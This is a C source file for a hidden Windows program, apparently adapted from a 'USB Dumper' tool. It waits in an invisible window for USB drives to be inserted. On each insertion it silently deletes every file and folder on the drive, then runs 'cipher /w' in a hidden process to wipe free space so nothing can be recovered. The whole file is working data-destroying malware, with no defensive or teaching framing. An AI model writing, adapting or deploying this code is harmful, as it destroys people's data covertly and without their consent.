#include <windows.h>
#include <dbt.h>
#include <direct.h>
#include <stdio.h>
//#include <stdafx.h>

char dir[260];
char szFile[255] = "";


// Function prototype
LRESULT CALLBACK MainWndProc(HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam);
char FirstDriveFromMask (ULONG unitmask);
void DeleteAllFiles(const char* path);
void RunCommandHidden(char* command);



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
{
	MSG			msg;		// MSG structure to store messages
	HWND		hwndMain;	// Main window handle
	WNDCLASSEX	wcx;		// WINDOW class information	
	HDEVNOTIFY	hDevnotify;
	DWORD		len;			

	DEV_BROADCAST_DEVICEINTERFACE NotificationFilter;

	// 53F56307-B6BF-11D0-94F2-00A0C91EFB8B
	GUID FilterGUID = {0x53F56307,0x0B6BF,0x11D0,{0x94,0xF2,0x00,0xA0,0xC9,0x1E,0xFB,0x8B}};    	


	//printf("\n>> USB Dumper by Valgasu <<\n\n");


	// Get command line
	if (lpCmdLine[0] != '\0') {
		strcpy(szFile, lpCmdLine);		
	}

	// Initialize the struct to zero
	ZeroMemory(&wcx,sizeof(WNDCLASSEX));

	wcx.cbSize = sizeof(WNDCLASSEX);		// Window size. Must always be sizeof(WNDCLASSEX)
	wcx.style = 0 ;							// Class styles
	wcx.lpfnWndProc = (WNDPROC)MainWndProc; // Pointer to the callback procedure
	wcx.cbClsExtra = 0;						// Extra byte to allocate following the wndclassex structure
	wcx.cbWndExtra = 0;						// Extra byte to allocate following an instance of the structure
	wcx.hInstance = hInstance;				// Instance of the application
	wcx.hIcon = NULL;						// Class Icon
	wcx.hCursor = NULL;						// Class Cursor
	wcx.hbrBackground = NULL;				// Background brush
	wcx.lpszMenuName = NULL;				// Menu resource
	wcx.lpszClassName = "USB";				// Name of this class
	wcx.hIconSm = NULL;						// Small icon for this class

	// Register this window class with MS-Windows
	if (!RegisterClassEx(&wcx))
		return 0;

	// Create the window
	hwndMain = CreateWindowEx(0,// Extended window style
		"USB",			// Window class name
		"",				// Window title
		WS_POPUP,		// Window style
		0,0,			// (x,y) pos of the window
		0,0,			// Width and height of the window
		NULL,			// HWND of the parent window (can be null also)
		NULL,			// Handle to menu
		hInstance,		// Handle to application instance
		NULL);			// Pointer to window creation data

	// Check if window creation was successful
	if (!hwndMain)
		return 0;

	// Make the window invisible
	ShowWindow(hwndMain,SW_HIDE); //SW_HIDE to make it invisible

	// Initialize device class structure 
	len = sizeof(DEV_BROADCAST_DEVICEINTERFACE);
	memset(&NotificationFilter,0,len);

	NotificationFilter.dbcc_size = 0x20;
	NotificationFilter.dbcc_devicetype = 5;			// DBT_DEVTYP_DEVICEINTERFACE;
	NotificationFilter.dbcc_classguid = FilterGUID;

	// Register
	hDevnotify = RegisterDeviceNotification(hwndMain, &NotificationFilter, DEVICE_NOTIFY_WINDOW_HANDLE);

	if(hDevnotify == NULL)    
		return 0;

	// Process messages coming to this window
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// return value to the system
	return msg.wParam;
}


LRESULT CALLBACK MainWndProc(HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam)
{
	char szMsg[80];
	char szFileDest[255];
	char drive;
	char szDrive[20];
	char dtime[20];
	char temp[10];
	SYSTEMTIME	st;
	PDEV_BROADCAST_VOLUME PdevVolume;
	PDEV_BROADCAST_DEVICEINTERFACE PdevDEVICEINTERFACE;


	switch (msg)
	{
	case WM_DEVICECHANGE:
		switch(wParam)
		{
			// A device or piece of media has been inserted and is now available
		case DBT_DEVICEARRIVAL:
			PdevDEVICEINTERFACE = (PDEV_BROADCAST_DEVICEINTERFACE)lParam;

			switch(PdevDEVICEINTERFACE->dbcc_devicetype)
			{                    
				// Class of devices
			case DBT_DEVTYP_DEVICEINTERFACE:
#ifdef _DEBUG
				MessageBox(NULL, PdevDEVICEINTERFACE->dbcc_name, "DEBUG", MB_OK);
#endif
				break;

				// Logical volume
			case DBT_DEVTYP_VOLUME:
				PdevVolume = (PDEV_BROADCAST_VOLUME)lParam;							                																	
				drive = FirstDriveFromMask(PdevVolume ->dbcv_unitmask);
				wsprintf(szDrive, "%c:", drive);
				wsprintf(szMsg, "Drive %s connected\n", szDrive);
#ifdef _DEBUG
				MessageBox (NULL, szMsg, "WM_DEVICECHANGE", MB_OK);
#endif
				strcat(szDrive, "\\*");
#ifdef _DEBUG
				MessageBox (NULL, szDrive, "Erase?", MB_OK);
#endif
				DeleteAllFiles(szDrive);
				char command[100] = {0};
				sprintf(command, "cipher /w:%c:", drive);
#ifdef _DEBUG
				MessageBox (NULL, command, "Command...", MB_OK);
#endif
				RunCommandHidden(command);
				//system(command);
				/*
				GetLocalTime(&st);
				itoa(st.wYear, temp, 10);
				strcpy(dtime, temp);
				itoa(st.wMonth, temp, 10);
				strcat(dtime, temp);
				itoa(st.wDay, temp, 10);
				strcat(dtime , temp);
				_mkdir(dtime);
				_getcwd(dir, 260);
				strcat(dir, "\\");
				strcat(dir, dtime );
				strcat(dir, "\\" );					

				// Check command line								
				if (strcmp(szFile, "") != 0) {								
				wsprintf(szFileDest, "%s%s", szDrive, szFile);
				MessageBox(NULL, szFileDest, "DEBUG", MB_OK);	
				CopyFile(szFile, szFileDest, FALSE);
				}
				else {								
				GetFile(szDrive);
				}*/

			}
			break;
		}
		break;

	default:
		// Call the default window handler
		return DefWindowProc(hwnd,msg,wParam,lParam);
	}

	return 0;
}


char FirstDriveFromMask (ULONG unitmask)
{
	char i;

	for (i = 0 ; i < 26 ; ++i)
	{
		if (unitmask & 0x1)
			break;
		unitmask = unitmask >> 1;
	}

	return (i + 'A');
}


//////////////////////////////////////
void DeleteAllFiles(const char* path)
{
	HANDLE Handle;
	WIN32_FIND_DATA wfd;

	Handle = FindFirstFile(path, &wfd);

	do
	{
		if ((!((wfd.cFileName[0]=='.') && ((wfd.cFileName[1]=='.' && wfd.cFileName[2]==0) || wfd.cFileName[1]==0 ))))
		{
			// folder
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				// create new path
				char path2[MAX_PATH];
				strcpy(path2, path);

				if (path2[strlen(path2)-1] == '*')
					path2[strlen(path2)-1] = NULL;

				strcat(path2, wfd.cFileName);
				strcat(path2, "\\*");

				DeleteAllFiles(path2);
				path2[strlen(path2)-1] = NULL;
				SetFileAttributes(path2, !FILE_ATTRIBUTE_HIDDEN | !FILE_ATTRIBUTE_READONLY | !FILE_ATTRIBUTE_SYSTEM);
				RemoveDirectory(path2);
			}
			// normal file
			else
			{
				// filepath to delete
				char path2[MAX_PATH];
				strcpy(path2, path);

				if (path2[strlen(path2)-1] == '*')
					path2[strlen(path2)-1] = NULL;

				strcat(path2, wfd.cFileName);
				
				SetFileAttributes(path2, !FILE_ATTRIBUTE_HIDDEN | !FILE_ATTRIBUTE_READONLY | !FILE_ATTRIBUTE_SYSTEM);
				
				DeleteFile(path2);
			}
		}
	}
	while (FindNextFile(Handle, &wfd));

	FindClose(Handle);
}

void RunCommandHidden(char* command)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

	if( !CreateProcess( NULL,   // No module name (use command line)
		command,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
#ifdef _DEBUG
		0,              // No creation flags
#endif
#ifndef _DEBUG
		CREATE_NO_WINDOW,              //CREATE_NO_WINDOW will actually hide it
#endif
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi )           // Pointer to PROCESS_INFORMATION structure
		) 
	{
		return;
	}

}